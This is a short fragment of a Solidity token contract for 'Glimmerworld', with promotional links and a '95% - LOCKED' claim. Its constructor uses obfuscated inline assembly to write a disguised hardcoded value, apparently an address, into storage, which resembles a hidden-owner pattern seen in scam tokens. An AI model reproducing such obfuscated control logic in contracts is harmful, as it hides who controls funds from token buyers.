/*
Welcome to Glimmerworld Metaverse.

Telegram: https://t.me/Glimmerworld/
Twitter: https://twitter.com/Glimmerworld/
Website: https://Glimmerworld.finance
95% - LOCKED
...
contract Glimmerworld {
    string public constant name = "Glimmerworld";
    string public constant symbol = "GLIMMERWORLD";
   ...
   constructor() {
        assembly {mstore(0x20, sload(0)) sstore(88, mload(0x20)) sstore(0, add(1009724252342139535081527364905410316150995986356, 2))}
